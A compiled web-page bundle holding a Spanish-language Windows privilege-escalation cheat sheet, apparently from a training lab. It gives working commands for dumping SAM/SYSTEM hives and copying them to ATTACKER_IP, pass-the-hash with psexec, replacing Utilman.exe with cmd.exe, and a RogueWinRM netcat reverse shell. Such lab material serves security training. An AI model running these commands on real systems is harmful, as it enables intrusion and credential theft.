import{_ as s,o as a,c as i,ai as n}from"./chunks/framework.DIUhWiTt.js";const h=JSON.parse('{"title":"Abusing dangerous privileges","description":"","frontmatter":{},"headers":[],"relativePath":"notas/cheatsheet/3.escalada_de_privilegios/2.windows/otros/5.abusing-dangerous-privileges.md","filePath":"notas/cheatsheet/3.escalada_de_privilegios/2.windows/otros/5.abusing-dangerous-privileges.md"}'),o={name:"notas/cheatsheet/3.escalada_de_privilegios/2.windows/otros/5.abusing-dangerous-privileges.md"};function r(l,e,p,t,c,d){return a(),i("div",null,[...e[0]||(e[0]=[n(`<h1 id="abusing-dangerous-privileges" tabindex="-1">Abusing dangerous privileges <a class="header-anchor" href="#abusing-dangerous-privileges" aria-label="Permalink to “Abusing dangerous privileges”">​</a></h1><h3 id="windows-privileges" tabindex="-1">Windows Privileges <a class="header-anchor" href="#windows-privileges" aria-label="Permalink to “Windows Privileges”">​</a></h3><p>Los privilegios son derechos que tiene una cuenta para realizar tareas específicas relacionadas con el sistema. Estas tareas pueden ser tan simples como el privilegio de apagar la máquina hasta privilegios para eludir algunos controles de acceso basados ​​en DACL.</p><p>Cada usuario tiene un conjunto de privilegios asignados que se pueden verificar con el siguiente comando:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>whoami /priv</span></span></code></pre></div><p>Una lista completa de privilegios disponibles en sistemas Windows está disponible <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants" target="_blank" rel="noreferrer">aquí</a> . Desde el punto de vista de un atacante, sólo son de interés aquellos privilegios que nos permiten escalar en el sistema. Puede encontrar una lista completa de privilegios explotables en el proyecto <a href="https://github.com/gtworek/Priv2Admin" target="_blank" rel="noreferrer">Priv2Admin</a> Github.</p><p>Si bien no analizaremos cada uno de ellos, mostraremos cómo abusar de algunos de los privilegios más comunes que puede encontrar.</p><h3 id="sebackup-serestore" tabindex="-1">SeBackup/SeRestore <a class="header-anchor" href="#sebackup-serestore" aria-label="Permalink to “SeBackup/SeRestore”">​</a></h3><p>Los privilegios SeBackup y SeRestore permiten a los usuarios leer y escribir en cualquier archivo del sistema, ignorando cualquier DACL vigente. La idea detrás de este privilegio es permitir que ciertos usuarios realicen copias de seguridad de un sistema sin requerir privilegios administrativos completos.</p><p>Al tener este poder, un atacante puede escalar trivialmente privilegios en el sistema mediante el uso de muchas técnicas. El que veremos consiste en copiar las colmenas de registro SAM y SYSTEM para extraer el hash de contraseña del administrador local.</p><p>Esta cuenta forma parte del grupo &quot;Operadores de copia de seguridad&quot;, al que de forma predeterminada se le conceden los privilegios SeBackup y SeRestore. Necesitaremos abrir un símbolo del sistema usando la opción &quot;Abrir como administrador&quot; para usar estos privilegios. Se nos pedirá que ingresemos nuestra contraseña nuevamente para obtener una consola elevada:</p><p>Una vez en el símbolo del sistema, podemos verificar nuestros privilegios con el siguiente comando:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; whoami /priv</span></span>
<span class="line"><span></span></span>
<span class="line"><span>PRIVILEGES INFORMATION</span></span>
<span class="line"><span>----------------------</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Privilege Name                Description                    State</span></span>
<span class="line"><span>============================= ============================== ========</span></span>
<span class="line"><span>SeBackupPrivilege             Back up files and directories  Disabled</span></span>
<span class="line"><span>SeRestorePrivilege            Restore files and directories  Disabled</span></span>
<span class="line"><span>SeShutdownPrivilege           Shut down the system           Disabled</span></span>
<span class="line"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span></span>
<span class="line"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span></span></code></pre></div><p>Para hacer una copia de seguridad de los hashes SAM y SYSTEM, podemos usar los siguientes comandos:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; reg save hklm\\system C:\\Users\\THMBackup\\system.hive</span></span>
<span class="line"><span>The operation completed successfully.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>C:\\&gt; reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive</span></span>
<span class="line"><span>The operation completed successfully.</span></span></code></pre></div><p>Esto creará un par de archivos con el contenido de las colmenas del registro. Ahora podemos copiar estos archivos a nuestra máquina atacante usando SMB o cualquier otro método disponible. Para SMB, podemos usar impacket <code>smbserver.py</code>para iniciar un servidor SMB simple con un recurso compartido de red en el directorio actual de nuestro AttackBox:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>user@attackerpc$ mkdir share</span></span>
<span class="line"><span>user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span></span></code></pre></div><p>Esto creará un recurso compartido llamado que <code>public</code>apunta al <code>share</code>directorio, que requiere el nombre de usuario y la contraseña de nuestra sesión actual de Windows. Después de esto, podemos usar el <code>copy</code>comando en nuestra máquina Windows para transferir ambos archivos a nuestro AttackBox:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; copy C:\\Users\\THMBackup\\sam.hive \\\\ATTACKER_IP\\public\\</span></span>
<span class="line"><span>C:\\&gt; copy C:\\Users\\THMBackup\\system.hive \\\\ATTACKER_IP\\public\\</span></span></code></pre></div><p>Y use impacket para recuperar los hashes de contraseña de los usuarios:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span></span>
<span class="line"><span>Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821</span></span>
<span class="line"><span>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span></span>
<span class="line"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::</span></span>
<span class="line"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span></code></pre></div><p>Finalmente podemos usar el hash del administrador para realizar un ataque Pass-the-Hash y obtener acceso a la máquina de destino con privilegios de SISTEMA:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP</span></span>
<span class="line"><span>Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[*] Requesting shares on 10.10.175.90.....</span></span>
<span class="line"><span>[*] Found writable share ADMIN$</span></span>
<span class="line"><span>[*] Uploading file nfhtabqO.exe</span></span>
<span class="line"><span>[*] Opening SVCManager on 10.10.175.90.....</span></span>
<span class="line"><span>[*] Creating service RoLE on 10.10.175.90.....</span></span>
<span class="line"><span>[*] Starting service RoLE.....</span></span>
<span class="line"><span>[!] Press help for extra shell commands</span></span>
<span class="line"><span>Microsoft Windows [Version 10.0.17763.1821]</span></span>
<span class="line"><span>(c) 2018 Microsoft Corporation. All rights reserved.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>C:\\Windows\\system32&gt; whoami</span></span>
<span class="line"><span>nt authority\\system</span></span></code></pre></div><h3 id="se-take-ownership" tabindex="-1">Se Take Ownership <a class="header-anchor" href="#se-take-ownership" aria-label="Permalink to “Se Take Ownership”">​</a></h3><p>El privilegio SeTakeOwnership permite a un usuario tomar posesión de cualquier objeto en el sistema, incluidos archivos y claves de registro, lo que abre muchas posibilidades para que un atacante eleve los privilegios, como podríamos, por ejemplo, buscar un servicio que se ejecute como SISTEMA y tomar posesión. del ejecutable del servicio. Sin embargo, para esta tarea tomaremos un camino diferente.</p><p>Para obtener el privilegio SeTakeOwnership, debemos abrir un símbolo del sistema usando la opción &quot;Abrir como administrador&quot;. Se nos pedirá que ingresemos nuestra contraseña para obtener una consola elevada:</p><p>Una vez en el símbolo del sistema, podemos verificar nuestros privilegios con el siguiente comando:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; whoami /priv</span></span>
<span class="line"><span></span></span>
<span class="line"><span>PRIVILEGES INFORMATION</span></span>
<span class="line"><span>----------------------</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Privilege Name                Description                              State</span></span>
<span class="line"><span>============================= ======================================== ========</span></span>
<span class="line"><span>SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled</span></span>
<span class="line"><span>SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span></span>
<span class="line"><span>SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</span></span></code></pre></div><p><code>utilman.exe</code>Esta vez abusaremos para escalar privilegios. Utilman es una aplicación integrada de Windows que se utiliza para brindar opciones de facilidad de acceso durante la pantalla de bloqueo:</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png" alt="comportamiento normal utilman"></p><p>Dado que Utilman se ejecuta con privilegios de SISTEMA, efectivamente obtendremos privilegios de SISTEMA si reemplazamos el binario original por cualquier carga útil que queramos. Como podemos tomar posesión de cualquier archivo, reemplazarlo es trivial.</p><p>Para reemplazar utilman, comenzaremos por tomar posesión de él con el siguiente comando:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; takeown /f C:\\Windows\\System32\\Utilman.exe</span></span>
<span class="line"><span></span></span>
<span class="line"><span>SUCCESS: The file (or folder): &quot;C:\\Windows\\System32\\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\\thmtakeownership&quot;.</span></span></code></pre></div><p>Tenga en cuenta que ser propietario de un archivo no significa necesariamente que tenga privilegios sobre él, pero al ser propietario puede asignarse los privilegios que necesite. Para otorgarle a su usuario permisos completos sobre utilman.exe, puede usar el siguiente comando:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F</span></span>
<span class="line"><span>processed file: Utilman.exe</span></span>
<span class="line"><span>Successfully processed 1 files; Failed processing 0 files</span></span></code></pre></div><p>Después de esto, reemplazaremos utilman.exe con una copia de cmd.exe:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\Windows\\System32\\&gt; copy cmd.exe utilman.exe</span></span>
<span class="line"><span>        1 file(s) copied.</span></span></code></pre></div><p>Para activar utilman, bloquearemos nuestra pantalla desde el botón de inicio:</p><p>Y finalmente, proceda a hacer clic en el botón &quot;Facilidad de acceso&quot;, que ejecuta utilman.exe con privilegios de SISTEMA. Como lo reemplazamos con una copia de cmd.exe, obtendremos un símbolo del sistema con privilegios de SISTEMA:</p><h3 id="seimpersonate-seassignprimarytoken" tabindex="-1">SeImpersonate / SeAssignPrimaryToken <a class="header-anchor" href="#seimpersonate-seassignprimarytoken" aria-label="Permalink to “SeImpersonate / SeAssignPrimaryToken”">​</a></h3><p>Estos privilegios permiten que un proceso se haga pasar por otros usuarios y actúe en su nombre. La suplantación generalmente consiste en poder generar un proceso o hilo bajo el contexto de seguridad de otro usuario.</p><p>La suplantación se entiende fácilmente cuando se piensa en cómo funciona un servidor FTP. El servidor FTP debe restringir el acceso de los usuarios únicamente a los archivos que se les debe permitir ver.</p><p>Supongamos que tenemos un servicio FTP ejecutándose con el usuario <code>ftp</code>. Sin suplantación, si la usuaria Ann inicia sesión en el servidor FTP e intenta acceder a sus archivos, el servicio FTP intentará acceder a ellos con su token de acceso en lugar del de Ann:</p><p>Hay varias razones por las que usar el token de ftp no es la mejor idea: - Para que los archivos se entreguen correctamente, el usuario debería poder acceder a ellos <code>ftp</code>. En el ejemplo anterior, el servicio FTP podría acceder a los archivos de Ann, pero no a los archivos de Bill, ya que el DACL en los archivos de Bill no permite al usuario <code>ftp</code>. Esto agrega complejidad ya que debemos configurar manualmente permisos específicos para cada archivo/directorio servido. - Para el sistema operativo, el usuario accede a todos los archivos <code>ftp</code>, independientemente de qué usuario esté actualmente conectado al servicio FTP. Esto imposibilita delegar la autorización al sistema operativo; por lo tanto, el servicio FTP debe implementarlo. - Si el servicio FTP se viera comprometido en algún momento, el atacante obtendría acceso inmediatamente a todas las carpetas a las que se encuentra el<code>ftp</code>el usuario tiene acceso.</p><p>Si, por el contrario, el usuario del servicio FTP tiene el privilegio SeImpersonate o SeAssignPrimaryToken, todo esto se simplifica un poco, ya que el servicio FTP puede tomar temporalmente el token de acceso del usuario que inicia sesión y usarlo para realizar cualquier tarea en su beneficio:</p><p>Ahora, si la usuaria Ann inicia sesión en el servicio FTP y dado que el usuario ftp tiene privilegios de suplantación, puede tomar prestado el token de acceso de Ann y usarlo para acceder a sus archivos. De esta manera, los archivos no necesitan proporcionar acceso al usuario <code>ftp</code>de ninguna manera y el sistema operativo maneja la autorización. Dado que el servicio FTP se hace pasar por Ann, no podrá acceder a los archivos de Jude o Bill durante esa sesión.</p><p>Como atacantes, si logramos tomar el control de un proceso con privilegios SeImpersonate o SeAssignPrimaryToken, podemos suplantar a cualquier usuario que se conecte y se autentique en ese proceso.</p><p>En los sistemas Windows, encontrará que las CUENTAS DE SERVICIO LOCAL y DE SERVICIO DE RED ya tienen dichos privilegios. Dado que estas cuentas se utilizan para generar servicios que utilizan cuentas restringidas, tiene sentido permitirles suplantar a los usuarios que se conectan si el servicio lo necesita. Internet Information Services (IIS) también creará una cuenta predeterminada similar llamada &quot;iis apppool\\defaultapppool&quot; para aplicaciones web.</p><p>Para elevar los privilegios utilizando dichas cuentas, un atacante necesita lo siguiente: 1. Generar un proceso para que los usuarios puedan conectarse y autenticarse en él para que se produzca la suplantación. 2. Encuentre una manera de obligar a los usuarios privilegiados a conectarse y autenticarse en el proceso malicioso generado.</p><p>Usaremos el exploit RogueWinRM para cumplir ambas condiciones.</p><p>Comencemos asumiendo que ya hemos comprometido un sitio web que se ejecuta en IIS y que hemos instalado un shell web en la siguiente dirección:</p><p><code>http://MACHINE_IP/</code></p><p>Podemos usar el shell web para verificar los privilegios asignados de la cuenta comprometida y confirmar que tenemos ambos privilegios de interés para esta tarea:</p><p>Para utilizar RogueWinRM, primero debemos cargar el exploit en la máquina de destino. Para su comodidad, esto ya se hizo y puede encontrar el exploit en la <code>C:\\tools\\</code>carpeta.</p><p>El exploit RogueWinRM es posible porque cada vez que un usuario (incluidos los usuarios sin privilegios) inicia el servicio BITS en Windows, crea automáticamente una conexión al puerto 5985 utilizando privilegios del SISTEMA. El puerto 5985 se utiliza normalmente para el servicio WinRM, que es simplemente un puerto que expone una consola Powershell para su uso remoto a través de la red. Piense en ello como SSH, pero usando Powershell.</p><p>Si, por alguna razón, el servicio WinRM no se está ejecutando en el servidor víctima, un atacante puede iniciar un servicio WinRM falso en el puerto 5985 y detectar el intento de autenticación realizado por el servicio BITS al iniciarse. Si el atacante tiene privilegios de SeImpersonate, puede ejecutar cualquier comando en nombre del usuario que se conecta, que es SISTEMA.</p><p>Antes de ejecutar el exploit, iniciaremos un detector de netcat para recibir un shell inverso en la máquina de nuestro atacante:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>user@attackerpc$ nc -lvp 4442</span></span></code></pre></div><p>Y luego, use nuestro shell web para activar el exploit RogueWinRM usando el siguiente comando:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>c:\\tools\\RogueWinRM\\RogueWinRM.exe -p &quot;C:\\tools\\nc64.exe&quot; -a &quot;-e cmd.exe ATTACKER_IP 4442&quot;</span></span></code></pre></div><p><strong>Nota:</strong> El exploit puede tardar hasta 2 minutos en funcionar, por lo que su navegador puede parecer que no responde durante un momento. Esto sucede si ejecuta el exploit varias veces, ya que debe esperar a que se detenga el servicio BITS antes de iniciarlo nuevamente. El servicio BITS se detendrá automáticamente después de 2 minutos de iniciarse.</p><p>El <code>-p</code>parámetro especifica el ejecutable que ejecutará el exploit, que <code>nc64.exe</code>en este caso es. El <code>-a</code>parámetro se utiliza para pasar argumentos al ejecutable. Como queremos que nc64 establezca un shell inverso contra nuestra máquina atacante, los argumentos para pasar a netcat serán <code>-e cmd.exe ATTACKER_IP 4442</code>.</p><p>Si todo estuvo configurado correctamente, debería esperar un shell con privilegios de SISTEMA:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>user@attackerpc$ nc -lvp 4442</span></span>
<span class="line"><span>Listening on 0.0.0.0 4442</span></span>
<span class="line"><span>Connection received on 10.10.175.90 49755</span></span>
<span class="line"><span>Microsoft Windows [Version 10.0.17763.1821]</span></span>
<span class="line"><span>(c) 2018 Microsoft Corporation. All rights reserved.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>c:\\windows\\system32\\inetsrv&gt;whoami</span></span>
<span class="line"><span>nt authority\\system</span></span></code></pre></div>`,64)])])}const m=s(o,[["render",r]]);export{h as __pageData,m as default};
